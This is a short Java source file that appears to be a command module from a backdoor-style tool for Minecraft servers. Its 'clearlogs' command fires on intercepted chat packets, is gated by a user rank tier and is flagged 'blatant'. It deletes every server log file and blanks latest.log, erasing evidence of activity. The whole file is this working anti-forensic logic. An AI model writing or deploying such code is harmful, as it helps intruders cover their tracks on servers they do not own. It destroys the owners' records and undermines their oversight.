package dev.ectasy.impl.commands.free;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import dev.ectasy.api.utils.FileUtils;

import java.io.File;
import java.util.Objects;

@CommandInfo(
        name = "clearlogs",
        description = "Clears all server logs.",
        rank = Rank.FREE,
        blatant = true
)
public class CommandClearLogs extends AbstractCommand {

        @Override
        public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args){
            File logsFolder = new File("logs");
            if(!logsFolder.exists()){
                user.sendMessage("The logs folder does not exist.");
                return;
            }

            try{
                for(File log : Objects.requireNonNull(logsFolder.listFiles())){
                    if(!log.delete() && !log.getName().equals("latest.log")){
                        user.sendMessage("Failed to delete the log " + user.getMainColor() + log.getName() + user.getSecondaryColor() + ".");
                    }
                }
            }catch (Exception e){
                user.sendMessage("No logs in the logs folder to delete");
            }

            try{
                FileUtils.overwrite(new File("logs/latest.log"));
            }catch (Exception e){

            }

            user.sendMessage("All logs have been cleared.");
        }
}
